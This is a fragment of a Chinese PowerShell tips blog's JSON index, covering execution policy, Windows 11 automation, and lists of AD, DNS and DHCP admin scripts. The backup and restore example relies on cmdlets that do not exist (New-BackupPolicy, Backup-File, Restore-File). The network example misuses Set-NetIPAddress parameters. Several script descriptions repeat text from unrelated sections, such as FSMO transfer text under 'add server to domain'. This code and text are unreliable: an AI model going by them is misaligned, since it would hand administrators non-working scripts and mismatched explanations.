执行策略要设置执行策略，您可以使用‘set-executionpolicy’命令后跟所需的策略级别。例如，要将执行策略设置为‘RemoteSigned’，您可以运行： 1set-executionpolicy RemoteSigned 请注意，在更改执行策略时需要具备管理权限。 获取执行策略要检查当前执行策略，请使用‘get-executionpolicy’命令。这将显示当前策略等级。 1get-executionpolicy 执行策略为什么重要？执行策略对于维护系统安全至关重要。默认情况下，PowerShell具有受限的执行策略，这意味着无法运行任何脚本。这有助于防止意外运行恶意脚本。 然而，在某些情况下，您可能需要在系统上运行脚本。在这种情况下，您可以将执行策略更改为更宽松的级别，例如“RemoteSigned”或“Unrestricted”。 值得注意的是，将执行策略更改为更宽松的级别可能会增加运行恶意脚本的风险。因此，建议仅在必要时更改执行策略，并在从不受信任的来源运行脚本时保持谨慎。 结论了解PowerShell执行策略对于任何IT专业人员或系统管理员都是至关重要的。它有助于维护系统安全性同时允许您在需要时运行脚本。 在这篇博客文章中，我们介绍了执行策略的基础知识、如何设置以及如何检查当前政策水平。请记住，在运行脚本时始终保持谨慎，并仅在必要时更改执行策略。","link":"/2023/10/21/Understanding-PowerShell-Execution-Policy-A-Guide-for-Beginners/"},{"title":"PowerShell 技能连载 - 使用 PowerShell 自动化 Windows 11 任务：实用指南","text":"您想通过自动化Windows 11系统上的各种任务来节省时间和精力吗？如果是这样，您应该学习如何使用PowerShell，这是一种强大的脚本语言和命令行工具，可以帮助您更快速、更轻松地完成任务。在本博客中，我们将向您展示如何使用PowerShell来自动化Windows 11上常见或复杂任务的一些实际示例，例如： 使用PowerShell管理网络设置和连接 使用PowerShell监视系统性能和资源 使用PowerShell备份和恢复文件夹与文件 使用PowerShell安装和更新Windows功能 使用PowerShell创建并运行定时任务 使用 PowerShell 管理网络设置与连接PowerShell 可以帮助您轻松高效地管理 Windows 11 系统上的网络设置与连接。您可以使用 PowerShell 执行各种操作，比如配置 IP 地址、DNS 服务器、防火墙、代理以及 VPN。 您还可以使用 PowerShell 测试网络连通性、ping 命令、traceroute 和解析主机名。 1234567891011# 定义接口别名, IP 地址, 子网掩码, 网关 和 DNS 服务器$interface = &quot;Ethernet&quot;$ip = &quot;192.168.1.100&quot;$subnet = &quot;255.255.255.0&quot;$gateway = &quot;192.168.1.1&quot;$dns = &quot;8.8.8.8&quot;# 设置接口的IP地址, DNS服务器 和 防火墙配置文件Set-NetIPAddress -InterfaceAlias $interface -IPAddress $ip -PrefixLength $subnet -DefaultGateway $gatewaySet-DnsClientServerAddress -InterfaceAlias $interface -ServerAddresses $dnsSet-NetFirewallProfile -Profile Private -Enabled True 使用 PowerShell 监控系统性能和资源PowerShell 可以帮助您轻松高效地监控 Windows 11 系统的系统性能和资源。您可以使用 PowerShell 执行各种操作，如获取 CPU、内存、磁盘和网络使用情况，测量命令或脚本的执行时间和内存消耗，并生成性能报告和图表。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# PowerShell script for monitoring system performance# Define the performance counters for CPU and memory usage$cpu = &quot;\\Processor(_Total)\\% Processor Time&quot;$memory = &quot;\\Memory\\Available MBytes&quot;# Get the performance counter data for CPU and memory usage$data = Get-Counter -Counter $cpu,$memory -SampleInterval 1 -MaxSamples 10# Create a chart object from the performance counter data$chart = New-Object System.Windows.Forms.DataVisualization.Charting.Chart$chart.Width = 800$chart.Height = 600$chart.BackColor = &quot;White&quot;# Add a chart area, a series for CPU usage, a series for memory usage, and a legend to the chart object$area = New-Object System.Windows.Forms.DataVisualization.Charting.ChartArea$area.AxisX.Title = &quot;Time (seconds)&quot;$area.AxisY.Title = &quot;Usage (%)&quot;$area.AxisY2.Title = &quot;Available (MB)&quot;$chart.ChartAreas.Add($area)$series1 = New-Object System.Windows.Forms.DataVisualization.Charting.Series$series1.Name = &quot;CPU&quot;$series1.ChartType = &quot;Line&quot;$series1.Color = &quot;Red&quot;$series1.BorderWidth = 3$series1.Points.DataBindXY($data.Timestamps,$data.CounterSamples[0].CookedValue)$chart.Series.Add($series1)$series2 = New-Object System.Windows.Forms.DataVisualization.Charting.Series$series2.Name = &quot;Memory&quot;$series2.ChartType = &quot;Line&quot;$series2.Color = &quot;Blue&quot;$series2.BorderWidth = 3$series2.YAxisType = &quot;Secondary&quot;$series2.Points.DataBindXY($data.Timestamps,$data.CounterSamples[1].CookedValue)$chart.Series.Add($series2)$legend = New-Object System.Windows.Forms.DataVisualization.Charting.Legend$legend.Docking = &quot;Top&quot;$chart.Legends.Add($legend)# Save the chart object as an image file$chart.SaveImage(&quot;C:\\Performance.png&quot;,&quot;png&quot;) 使用 PowerShell 备份和恢复文件夹PowerShell 可以帮助您轻松高效地备份和恢复 Windows 11 系统中的文件夹。您可以使用 PowerShell 执行各种操作，如创建、复制、移动、重命名、删除、搜索和压缩文件夹。您还可以使用 PowerShell 创建和使用备份策略、备份集和备份项。 12345678910111213# PowerShell script for backing up and restoring files and folders# Define the folder to backup and the backup location$folder = &quot;C:\\Users\\YourName\\Documents&quot;$location = &quot;D:\\Backup&quot;# Create a backup policy that runs daily and keeps backups for 30 days$policy = New-BackupPolicy -Frequency Daily -RetentionPeriod 30# Set the backup policy for the computerSet-BackupPolicy -Policy $policy# Backup the folder to the backup locationBackup-File -Source $folder -Destination $location Here is a summary of a PowerShell script that restores a file or folder from a backup to a specified location: 12345678910111213# Define the file or folder to restore and the restore location$file = &quot;C:\\Users\\YourName\\Documents\\Report.docx&quot;$location = &quot;C:\\Users\\YourName\\Desktop&quot;# Get the latest backup set that contains the file or folder$set = Get-BackupSet | Sort-Object -Property CreationTime -Descending | Select-Object -First 1# Get the backup item that matches the file or folder$item = Get-BackupItem -BackupSet $set -Path $file# Restore the file or folder to the restore locationRestore-File -BackupItem $item -Destination $location 使用 PowerShell 安装和更新 Windows 功能PowerShell 可以帮助您轻松高效地在 Windows 11 系统上安装和更新 Windows 功能。您可以使用 PowerShell 执行各种操作，如列出、启用、禁用或更新诸如 Hyper-V、Windows 子系统 for Linux 或 Windows 沙盒等 Windows 功能。 123# 用于安装和更新 Windows 功能的 PowerShell 脚本# 在计算机上安装 Hyper-V 功能Install-WindowsFeature -Name Hyper-V -IncludeManagementTools -Restart 以下是一个概要说明了一个 PowerShell 脚本，该脚本从计算机中卸载了 Windows 子系统 for Linux 功能并移除相关文件： 12# 从计算机中卸载 Windows 子系统 for Linux 功能Uninstall-WindowsFeature -Name Microsoft-Windows-Subsystem-Linux -Remove 使用 PowerShell 创建和运行定时任务PowerShell 可以帮助您轻松高效地在 Windows 11 系统上创建和运行定时任务。您可以使用 PowerShell 执行各种操作，如创建、注册、启动、停止或禁用定时任务，例如运行一个 PowerShell 脚本、发送电子邮件或显示消息。 123456789101112131415# 用于创建和运行定时任务的 PowerShell 脚本# 定义要运行的 PowerShell 脚本$script = &quot;C:\\Scripts\\Backup.ps1&quot;# 创建一个新的定时任务动作来运行这个 PowerShell 脚本$action = New-ScheduledTaskAction -Execute &quot;powershell.exe&quot; -Argument &quot;-File $script&quot;# 创建一个新的触发器，在每天早上10点执行该任务$trigger = New-ScheduledTaskTrigger -Daily -At 10am# 创建一组新的设置，如果任务执行时间过长则停止该任务$setting = New-ScheduledTaskSettingSet -ExecutionTimeLimit (New-TimeSpan -Minutes 30)# 在计算机上注册这个新的定时任务，并指定名称、动作、触发器及设置Register-ScheduledTask –Name &quot;Backup&quot; –Action $action –Trigger $trigger –Setting $setting 结论PowerShell 是一款多才多艺且强大的工具，可帮助您自动化处理在Windows 11系统上进行各种操作。您可以在官方PowerShell文档中找到更多关于PowerShell 的信息和示例。感谢阅读此篇博客文章。希望对你有所帮助并且有趣。 😊","link":"/2024/02/15/Automate-Windows-11-Tasks-with-PowerShell-A-Practical-Guide/"},{"title":"PowerShell 技能连载 - 25个最佳的Powershell脚本仓库","text":"我最喜欢的部分之一是创建略有不同的脚本，我在这方面也取得了成功，并创建了Powershell脚本存储库。今天我必须说，我已经记不清自己创建了多少个脚本。除了AD、DNS和DHCP之外，此存储库还包含许多其他必备的脚本。从GPO到DFS Powershell脚本以及许多其他相关的Powershell脚本，使我的工作团队体验达到第九云。 这些脚本显然是为自动化而创建的，并且将它们保留在手头上被认为是犯罪行为，因此展示在该类别中。虽然我们知道组策略在任何环境中设置规则时起着重要作用，并且DFS也很重要，那么为什么不通过查看下面推荐书籍来更深入地了解它们呢？ 为您提供的有用PowerShell命令获取所有组策略命令 1Get-command -Module grouppolicy 获取 GPO 报告 1Get-GPOReport -All -Domain xyz.com 重置 GPO 1Restore-GPO -Name &quot;GPOname&quot; -Path \\\\Server1\\Backups 备份 GPO 1Backup-Gpo -All -Path \\\\Server1\\GpoBackups 获取DFS复制组 1Get-DfsReplicationGroup -GroupName RG02 获取DFS复制成员 1Get-DfsrMember -GroupName &quot;RG07&quot; -ComputerName &quot;SRV01&quot; 重启多台计算机 1Restart-computer -computername A,B,C 获取所有服务 1Get-service 我的Powershell脚本仓库 Map drive Create server Inventory Server uptime report Memory and CPU utilization from multiple servers Patch Management Disk Space Report Get process and user running it Software installation on multiple server Search file type Deleting print queues Script to check who rebooted Restart multiple Computers NIC details Check Local admin DFS Replication status Ping status GPO creation and Deletion Check for SMB v1 and SMB v2 Service Status OS License Checker Restore GPO OS-Page File Configuration Pre-Patch checker Certificate Expiry checker Share drive size","link":"/2024/03/05/25-Best-Powershell-Script-Repository/"},{"title":"PowerShell 技能连载 - 7 个用于管理 DHCP 的最佳 PowerShell 脚本","text":"从DHCP范围获取IP看起来很容易，但当涉及检查每个范围的健康状况时，情况就变得非常困难了，无论是满还是是否需要创建任何超范围。如果您是服务器管理员，您真的知道我在说什么，当客户抱怨他们没有获得任何IP地址时确实很痛苦，并且你会发现在你的范围中一切都是空白。 使DHCP服务器或范围动态更新多个DHCP服务器上的DNS并不容易，并且知道它所处域中确切位置的范围更加艰难。通过Powershellguru，我的目标始终是为我在生产环境中通常遇到的问题提供简单解决方案。以下是一些关于DHCP及其工作原理以及Powershell相关书籍可以参考。希望您喜欢，并且大多数免费软件总是驻留在维基百科和微软网站上。 DHCP有用的Powershell命令为DHCP服务器服务添加一个对象 1Add-DhcpServerInDC -DnsName &quot;dhcp.xyz.com&quot; 备份 DHCP 数据库 1Backup-DhcpServer -ComputerName &quot;dhcp.xyz.com&quot; -Path &quot;%systemroot\\dhcp\\backup&quot; 导出所有 DHCP 设置 1Export-DhcpServer -ComputerName &quot;dhcp.xyz.com&quot; -File &quot;path\\config.xml&quot; 获取范围内的所有活动租约 1Get-DhcpServerv4Lease -ComputerName &quot;dhcp.xyz.com&quot; -ScopeId IP 按名称获取策略的属性 1Get-DhcpServerv4Policy -ComputerName &quot;dhcp.xyz.com&quot; -Name &quot;policyname&quot; DHCP故障转移通常创建一个故障转移是更好的选择。所有请求不会只发送到一个特定的DHCP服务器，而是由2台服务器共同管理。 工作原理此脚本将在两个DHCP服务器之间创建故障转移，我们需要指定范围。稍后，脚本将在这两个DHCP服务器之间创建故障转移。 可能的结果运行脚本后，请检查故障转移是否正常工作。请求应该同时发送到两台服务器上。 下载您可以从以下链接下载脚本。 DHCP Failover DHCP备份在您的环境中未配置故障转移时，备份DHCP是一个福音。您可以将备份恢复到上次备份的时间点，一切都会重新在线。 工作原理路径已经设置好了，我们需要在dhcp服务器上运行脚本，这样就会创建一个dhcp的备份。 问题结果该脚本减少了我们通过GUI手动操作的工作量，并在提供的位置创建了备份。 下载您可以从下面下载脚本。 备份 DHCP 服务器 DNS 动态更新IP地址动态分配是DHCP的角色之一，并不会自动启用，需要通过GUI手动完成。但为什么要匆忙去使用GUI呢？当你可以通过Powershell来做时。 工作原理此脚本将根据需求为范围或所有范围启用DNS动态更新设置。 可能结果动态更新将被启用，并且对于启用DHCP的机器主机解析将得到纠正。 下载您可以通过突出显示的链接下载该脚本。 配置 DNS 动态更新 配置租约持续时间按照微软公司规定，租约持续时间始终设定为8天。但实际情况下我们可能会针对范围进行更改，那么为什么要使用GUI进行操作呢？当我们可以编写一个脚本时。 工作原理对于提供的范围，您可以使用此脚本设置租约持续时间。 可能的结果将设置租约持续时间，如果需要，我们可以在任何计算机上进行测试，否则它将按预期工作。 下载您可以通过突出显示的链接下载该脚本。 配置DHCP租约持续时间 DHCP健康检查这是最实用的脚本之一，让我们了解范围、子网、是否禁用某个范围等。所有必备且可下载的独特脚本。 工作原理脚本将扫描给定服务器的范围，并通过邮件发送结果。 可能的结果我们将收到关于范围详情的信息，这对于了解其中任何一个即将填满的情况很重要。 下载您可以通过突出显示的链接下载脚本。 DHCP健康检查 创建多个DHCP范围如果需要创建多个DHCP范围，那么这个脚本就是为您量身定制的，请根据您的需求进行检查。 工作原理它需要输入并且我们需要提供注释，以便快速创建范围。 可能的结果所有提供的输入都将用于创建多个DHCP范围，这是一种非常方便实用的脚本。 下载您可以通过突出显示的链接下载该脚本。 create scope 从多个范围获取路由器详细信息曾经想过从多个范围中获取路由器IP详细信息吗？好吧，Powershell已经为我们创造了一个拯救生命般存在着这样一个脚本来完成此任务。 工作原理使用 Get-DhcpServerv4Scope 在文本格式中提供范围ID详情，并且它会从给定范围中获取路由器IP地址。 可能结果结果将以csv格式呈现，在其中包含有关路由器IP详细信息和其所属ID。 下载您可以通过以下链接下载该脚本。 router","link":"/2024/03/05/7-Best-Powershell-scripts-to-manage-DHCP/"},{"title":"PowerShell 技能连载 - 管理 DNS 的 8 个最佳 Powershell 脚本","text":"Active Directory 的另一个主要部分是 DNS。如果您是 Windows 服务器管理员，那么您很清楚它的工作原理，但在没有知道命令实际操作的情况下，使用 Powershell 进行管理和自动化有时会变得困难。 DNS 在组织中扮演着至关重要的角色，因此需要一些窥视来确保其正常运行。在我们领域中，通过 GUI 为服务器或工作站创建 DNS 记录似乎很容易，但当需要同时创建多个 DNS 记录时就会变得困难起来。从创建记录到将其指向正确的 IP 地址都具有挑战性。但我已经接受了这一挑战，并编写了一些相关脚本，并对其进行了优化以便无需任何混乱即可运行。如果您喜欢这部分内容，则肯定也会喜欢 DHCP powershell 脚本以及我的 powershell 脚本库。 好的开始意味着良好的结束，在下面是一些例子。从恢复 DNS 服务器到在 DNS 中创建区域，我都做到了。以下是一些书籍供您参考，如果您打算学习关于 DNS 或 powershell 的知识，请查阅以下最佳可用 DNS Powershell 脚本列表。 对于DNS有用的Powershell命令添加DNS转发器 1Add-DnsServerForwarder -IPAddress IP -PassThru 添加根提示服务器 1Add-DnsServerRootHint -NameServer &quot;domain.com&quot; -IPAddress IP 获取DNS服务器配置 1Get-DnsServer -ComputerName &quot;IP&quot; 获取DNS服务器转发器设置 1Get-DnsServerForwarder 从DNS服务器中删除转发器 1Remove-DnsServerForwarder -IPAddress IP -PassThru 设置DNS服务器配置 1Get-DnsServer -CimSession IP | Set-DnsServer 清除 DNS 缓存 1Clear-DnsServerCache -ComputerName &quot;Name of server&quot; -Force 恢复 DNS 区域在 Powershell 中使用简单命令创建区域更加容易，无需转到 dnsmgmt.msc 创建新的所需区域。 工作原理脚本将在备份文件夹中搜索备份，并搜索可以恢复的指定区域。 可能结果如果您提供了所有正确信息，则 DNS 区域应该会通过最新备份恢复。 下载您可以从以下链接下载脚本： 恢复 DNS 区域 创建主/辅助/存根区域错误地删除了 DNS 区域？别担心，只要有 dns 区域的备份。这是一个非常方便的脚本来恢复 DNS 区域。 工作原理只需提供将在所需服务器上创建辅助区域的区 IP 地址即可。 问题结果主 / 辅助 / 存根区将在所需服务器上创建。 下载您可以从以下链接下载脚本： 主要区 次要区 存根区 创建DNS转发器在PowerShell中创建DNS转发器非常快速和简单。只需一行代码就可以摆脱繁琐的点击。 工作原理提供批量或单个IP地址，并运行脚本，应该会创建DNS转发器，但请确保提供正确的IP地址。 可能的结果该脚本将创建DNS转发器，应该可以ping通，并且请求应被重定向到转发器。 下载您可以从以下链接下载脚本。 DNS 转发器 修改DNS记录在PowerShell中创建DNS转发器非常快速和简单。只需一行代码就可以摆脱繁琐的点击。 工作原理提供批量或单个IP地址，并运行脚本，应该会创建DNS转发器，但请确保提供正确的IP地址。 可能的结果该脚本将创建DNS转发器，应该可以ping通，并且请求应被重定向到转发器。 下载您可以从以下链接下载脚本。 修改主机记录 - 内部 创建多个 DNS 记录是否曾经面对过搜索要更改 IP 的 DNS 记录挑战？PowerShell已经使这变得如此简便可靠。这个脚本是一个很好的例子。 工作原理它将把主机名（hostname）的 IP 更改为所需 IP 地址。只需提供正确详细信息并查看其工作方式。 可能结果如果一切顺利，则主机名 IP 应更换为新提供的 IP 地址。 下载您可以从以下链接下载此脚本。 create-dns-record 检查多台主机 FQDN假设有这样一种情况：你被要求在环境中提供多台主机 FQDN ，但你不知道其中有多少是工作组服务器“麻烦”，我专门为这种时刻编写了一个脚本, 以便不必逐个通过 nslookup 进行检查而实际上我们也能够为同样目标编写一个相同功能性质 的 脚步 。FQDN 看起来像 hostname.xyz.com 。 工作原理它将使用 nslookup 并在短时间内提供多台服务器 FQDN 。 可能结果如果它存在于您环境中，则会获取到 主机 FQDN ，如果不存在，则需要检查是否是工作组服务器或者列表中是否存在拼写错误。如果遇到任何问题，请随时联系我；如果需要视频演示，请告诉我. 您直接通过 Facebook 或 Gmail 联系我，在页尾都有我的邮箱. 下载您可从下方链接下载此文件. nslookup","link":"/2024/03/20/8-Best-Powershell-scripts-to-manage-DNS/"},{"title":"PowerShell 技能连载 - 15个最佳的Active Directory Powershell脚本","text":"我已经整理了一些最佳的Active Directory Powershell脚本，以下内容肯定会为您节省时间和工作。管理域是Active Directory的工作，了解每一个内容都是必须的。Active Directory包括用户、组，可以在Active Directory用户和计算机（ADUC）中进行检查。在域中创建用户或保留用户在域中是Windows管理员的工作。 当我工作多年时，我遇到过许多挑战作为Windows管理员有时候不容易在您的域内创建一组用户或组。这需要自动化以节省时间。如果您喜欢这个类别，还有其他类别可以探索。还有DNS powershell脚本、DHCP powershell脚本和我的自己的powershell存储库。 用于Active Directory的有用Powershell命令获取域中的所有AD用户 1Get-aduser -properties * -filter * 导入Active Directory模块 1Import-module activedirectory 从域中获取所有计算机 1Get-adcomputer -properties * -filter * 通过SAM账户名称禁用AD用户 1Disable-ADaccount -identity &quot;Name&quot; 将数据导出为CSV格式 1Get-adcomputer -properties * -filter * |export-csv &quot;give path&quot; 获取AD组的SAM账户名称 1Get-ADgroup -identity &quot;provide group name&quot; 选择特定用户属性 1Get-ADUser -properties * -filter * 获取域信息 1Get-ADdomain 安装Active Directory角色 1Install-WindowsFeature AD-Domain-Services 获取域控制器列表 1Get-ADDomainController AD用户恢复从域控制器中恢复已删除的用户。在进行AD清理时，我们有时会删除AD用户，这给我们带来了许多问题。为满足需求提供解决方案如下。 工作原理从域控制器中恢复已删除的用户。在进行AD清理时，我们有时会删除AD用户，这给我们带来了许多问题。为满足需求提供解决方案如下，在Active Directory Powershell脚本中。 可能的结果运行此脚本后，在dsa.msc中搜索该用户应该可以找回而不丢失任何信息。此脚本非常实用，我希望使用它而不是通过GUI操作。 下载您可以从以下链接下载脚本。 AD-User Recover 将服务器添加到域将服务器添加到域、更改IP地址是一项艰巨任务，并且有时令人沮丧，那么为什么不自动化呢？该脚本无缝运行没有任何故障。这是活动目录Powershell脚本类别中很棒的一个。 工作原理通常情况下，该脚本要求提供首选项1-6, 您想将哪个角色发送到另一个DC. 同样如果使用GUI执行，则是一项艰巨任务, 因此在PowerShell 中非常容易. 在这些脚本中, 如果转移成功，则会收到提示表示角色已成功转移. 可能的结果运行此脚本后, 您将能够将角色从一个DC传输至另一个ad并进行检查. FSMO 角色非常重要，请务必小心操作。 下载您可以通过以下链接下载脚本。 FSMO Role Transfer 在 AD 中禁用不活跃用户禁用 AD 用户是一个月度活动，如果有很多用户，通过 GUI 执行可能会很困难。我为您带来了一段脚本，您可以通过 Powershell 批量禁用用户。 工作原理该脚本将要求输入要禁用的用户标识，并提供一个包含用户信息的表格以进行批量操作，它将使用 Sam 账户进行识别。使用 Powershell 看起来很简单对吧？是的，这非常容易。 预期结果运行此脚本后，您将能够从一个 DC 转移角色到另一个 ad 并且还可以检查。FSMO 角色非常重要，请务必小心操作。 下载您可以从下面下载该脚本。 Disable Active directory User 不活跃用户报告在审核过程中可能需要提供未使用系统或者已经有一段时间没有登录的用户列表，在这种情况下这个脚本就派上了用场并使得事情变得更加简单。 工作原理该脚本获取那些已经有一定时间（比如 90 天）没有登录系统的人员名单，并发送邮件通知我们。请确保正确定义了 SMTP 设置以便接收邮件通知。 预期结果该脚本将展示给你那些已经有指定时间内未登录系统的不活跃用户名单 下载您可以从下面下载该脚本 AD-InActive Users Report-90 Days 获取 AD 计算机详细信息至 CSV 文件中在审核过程中可能需要提供未使用系统或者已经有一段时间没有登录的计算机列表，在这种情况下这个脚本就派上了用场并使得事情变得更加简单。 如何运行该程序会列出环境中计算机清单并导出到 csv 文件。 题外话我们能够拿到包含计算机清单内容的 csv 文件。 下载您可点击以下链接下载此文件。 AD computers to csv 启动 AD 回收站当你不想丢失删除用户名信息时启动回收站是必须做的事情。启动回收站优势之处在于我们只需几次点击或执行命令即可轻松恢复任何用户名信息。 工作原理这只是一组命令来启动回收站而无需通过 Windows 设置逐步点击鼠标。此程序易于操作且无任何问题地执行。 题外话运行完毕后, 您可检查是否成功启动回收站也可查看输出显示内容. 下载您可点击以下链接下载此文件. Enable Recycle bin 删除 AD 对象AD 对象既可以是计算机也可以是用户, 此程序为你提供删除环境中某个特定对象及其相关设备功能. 不再需要手工去 GUI 中删除对象. 工作原理该脚本通常使用switch case，以便您可以在用户或计算机删除之间选择正确的选项，并删除选择并在结果屏幕上提供更新。 可能的结果用户或计算机将从域中删除，并可以使用我已经在AD脚本部分中拥有的脚本进行恢复。 下载您可以从以下链接下载脚本。 AD-object-deletion 创建多个AD组一次性创建多个AD组。只需在CSV文件中提供详细信息，脚本将获取结果并创建所需的AD组。这是一个很方便查看的实用脚本之一。 工作原理通常情况下，该脚本将从CSV文件中获取输入，并在定义的OU下创建所需的组。 可能的结果无需手动检查即可创建AD组。只需提供所需详细信息即可。 下载您可以从以下链接下载该脚本。 Create Multiple AD Groups 将AD用户详细信息提取到CSV文件中提取AD用户详细信息是一个类似于审计过程每月都会执行的操作。了解关于用户每个详情对每个组织来说都很重要。这是一个简单的用于获取有关用户各种详情的脚本。 可能的结果您可以通过检查最后登录日期和其他属性来确定是否需要进行任何清理。 下载您可以从下面下载脚本。 AD user to csv AD用户 - 成员 - 创建时间这是一个在powershellgallery中由一位用户提出的问题，我已经创建了该脚本并要求他测试，结果很成功。 工作原理此脚本将检查用户及其成员资格，并获取用户帐户创建日期。 可能的结果您将能够了解用户属于哪个组以及用户在域中是何时创建的。 下载您可以从下面下载脚本。 AD-when-created-memberof 上次设置密码日期无法直接从PowerShell中获取上次设置密码日期，我们需要对脚本进行一些更改。如果尝试获取上次设置密码，则会显示1601年的日期。因此，我已经创建了一个用于获取给定samaccount的上次密码日期的脚本。 工作原理该脚本将获取用户最后设置密码属性，并将其修改为正确的日期。可使用txt文档提供用户列表。 下载您可以从下面下载脚本。 Last password set OU 单个和批量创建需要无需任何点击即可创建 OU，我已经为此创建了一个脚本，在其中您可以单独创建或批量创建 OU。 工作原理在 Powershell 中，OU 创建是一个单一命令，但批量创建需要提供输入，这可以通过 CSV 或文本文件提供，并且在此脚本中完成相同操作。 可能的结果如果操作正确，则您将能够在 dsa.msc 中看到已经创建的 OU。 下载您可以从下面下载该脚本。 create OU AD 用户删除 单个和批量需要无需任何点击即可删除用户，我已经为此创建了一个脚本，在其中您可以单独删除用户或批量删除用户。 工作原理用户删除 是 Powershell 中的一个单一命令，但进行批量删除 需要提供输入，这可以通过 CSV 或文本文件提供，并且在此脚本中完成相同操作。 可能的结果如果操作正确，则你将不能 在 dsa.msc 中看到被删除的用户。 下载您可以从下面下载脚本。 delete-user-account AD 复制状态想要了解域中 AD 的复制状态，这是最适合的脚本。它提供复制状态，如果有任何错误，则会显示相同的内容。 工作原理它类似于 repadmin/replsum，在 HTML 格式中提供相同的结果。 可能的结果如果您的域复制不一致，可以安排此脚本每小时运行，以便检查和故障排除。 下载您可以从下面下载该脚本。 AD-Replication-status 过期对象报告想要知道仍然存在于您域中的悬挂对象吗？那么这是一个很好的脚本，可获取并帮助完全创建这些对象。这是 Active Directory Powershell 脚本类别中最有趣的脚本之一。 工作原理它将获取在指定时间范围内未被使用的悬挂对象。 可能的结果如果符合搜索条件，您可以删除过期对象。 下载您可以从下面下载该脚本。 Stale comp reports 添加或移除多个用户从多个组想要知道仍然存在于你领域里但已经不存在了吗？那么这就是一个很好地能够找到并且帮助你完全创建新目标物体。 工作原理它使用 csv 文件读取您的输入并在您的环境中执行，这是一个专门设计的脚本，可以智能地运行并完成您的工作。 可能结果脚本运行后，可能结果是用户将被删除或添加到所需的安全组。如果您有疑问，请直接通过 Facebook 或 Gmail 与我联系，两者都在页脚中提到。 下载您可以从以下链接下载该脚本。 Multiple user remove from groups Add multiple user to multiple groups 从多台服务器获取 NTP 源当我们遇到时间同步相关问题时，有时最好检查服务器取时间的来源。这是系统管理员需要进行的一般性练习。因此为此添加了一个脚本。 工作原理它读取服务器列表的输入，并尝试从提供的列表中获取 NTP 源。 可能结果它读取服务器列表的输入，并尝试从提供的列表中获取 NTP 源。 下载您可以从下面下载脚本。 NTP Source 比较 AD 组有时候当您需要比较两个 AD 组并找出其中缺失的一个时，情况可能会变得复杂，因为某些用户被添加到了特定组中。我创建了一个简单的脚本来节省时间，并与您分享。 工作原理该脚本将比较提供的两个组，并显示这两个组之间缺少什么。如果值显示“==”，则表示用户在两个组中都存在；如果显示“=&gt;”或“&lt;=”，则意味着某些用户在其中一个组中缺失。 预期结果使用该脚本，您将知道哪些用户缺失或哪些安全组缺失。 下载您可以从下面下载脚本。 compare ad groups 镜像 AD 组曾经想过将相似的用户添加到不同的组中，以便它们互为镜像吗？很容易通过 Powershell 实现，并且可以节省我们宝贵的时间。 工作原理该脚本将从提供的两个 AD 组获取用户列表，如果目标 AD 组中缺少参考AD组成员，则会将该用户添加到目标组中。 预期结果参考和目标AD群体都将具有相同成员。 下载您可以从下面下载腳本. Add missing AD group members","link":"/2024/03/23/15-Best-Active-Directory-Powershell-Scripts/"},{"title":"PowerShell blog post collection (2023-04 ~ 2024-03)","text":"2023 年 04 月 2023-04-11 使用 PowerShell 解决问题（第 4 部分） 2023-04-13 更丰富的打印机信息 2023-04-17 PowerShell 废弃功能 (第 1 部分：PowerShell 2.0) 2023-04-19 PowerShell 废弃功能（第 2 部分：Exchange Online 中的远程 PowerShell (RPS)） 2023-04-21 常见陷阱和奇怪结果：比较运算符 2023-04-25 重命名属性（简单方法） 2023-04-27 Office365邮箱恢复删除（第 1 部分） 2023 年 05 月 2023-05-01 列出所有域控制器 2023-05-01 永久删除硬盘内容 2023-05-01 Office365邮箱恢复删除（第 2 部分） 2023-05-03 彻底删除硬盘数据 2023-05-05 列出所有域控制器 2023-05-09 列出活动的域控制器 2023-05-11 进度条技巧（第 1 部分） 2023-05-13 进度条技巧（第 2 部分） 2023-05-17 进度条技巧（第 3 部分） 2023-05-19 进度条技巧（第 4 部分） 2023-05-21 创建 ISO 文件 2023-05-23 创建 ISO 文件 2023-05-25 挂载 ISO 文件 2023-05-29 两种类型转换（和一个 bug） 2023-05-31 Invoke-RestMethod 退出错误 2023 年 06 月 2023-06-02 获取父级文化 2023-06-06 SpeculationControl：使用 PowerShell 检查风险 2023-06-08 测试驱动 PowerShellGet 版本 3 2023-06-15 7个用于管理DHCP的最佳PowerShell脚本 2023-06-29 选择最适当的文件格式（第 1 部分） 2023 年 07 月 2023-07-04 学习在Powershell中使用管道的3种有效方法 2023-07-05 选择最佳的文件格式（第 3 部分） 2023-07-07 选择最佳的文件格式（第 4 部分） 2023-07-11 PowerShell 脚本未经确认无法运行 2023-07-13 从 DateTime 中生成日期 2023-07-17 星座计算器（又称“Sternzeichen”） 2023-07-19 避免使用 Get-EventLog 2023-07-21 轻松过渡至 Get-WinEvent 2023-07-25 自动化控制面板 2023-07-27 带有掩码的输入 2023-07-31 管理文件共享 2023 年 08 月 2023-08-02 识别未正确加密的 AD 账户 2023-08-04 Microsoft Graph PowerShell 社区示例页面 2023-08-08 寻找开始时间退化 2023-08-10 10个每个人都应该知道的有用PowerShell命令 2023-08-10 获取德国节日 2023-08-14 Windows 系统的温度控制 2023-08-20 理解PowerShell中的错误处理 2023-08-24 获取法国假期 2023 年 09 月 2023-09-01 PowerShell函数的手把手指南 2023-09-09 PowerShell 过滤器：使用 Where-Object 和 Select-Object 2023 年 10 月 2023-10-21 理解 PowerShell 执行策略：初学者指南 2023 年 11 月 2023-11-01 轻松掌握PowerShell中的ErrorAction 2024 年2024 年 01 月 2024-01-11 PowerCLI: The Easy Way To Manage VMware 2024 年 02 月 2024-02-15 使用 PowerShell 自动化 Windows 11 任务：实用指南 2024 年 03 月 2024-03-05 25个最佳的Powershell脚本仓库 2024-03-05 7 个用于管理 DHCP 的最佳 PowerShell 脚本 2024-03-09 针对Windows服务器的4种强大的PowerShell安全技术 2024-03-20 管理 DNS 的 8 个最佳 Powershell 脚本 2024-03-23 15个最佳的Active Directory Powershell脚本","link":"/2024/03/30/blog-index/"},{"title":"PowerShell 技能连载 - 针对Windows服务器的4种强大的PowerShell安全技术","text":"简介在不断发展的网络安全领域中，加固您的Windows服务器不仅是最佳实践，而且是必要的。PowerShell凭借其多功能性和自动化能力，在确保服务器安全的神奇旅程中成为我们可靠的魔杖。让我们讨论一下4种PowerShell安全技术，这将有助于实现我们的目标。 PowerShell安全性: 使用PowerShell进行审计使用POSH-Sysmon配置SysmonSysmon: 沉默的哨兵 由微软开发的Sysmon是一个强大的工具，用于监视系统并添加细粒度事件以便即使在重启后也能被跟踪。 这就像拥有一把神奇的放大镜，可以揭示服务器上隐藏的活动。 为什么使用POSH-Sysmon? 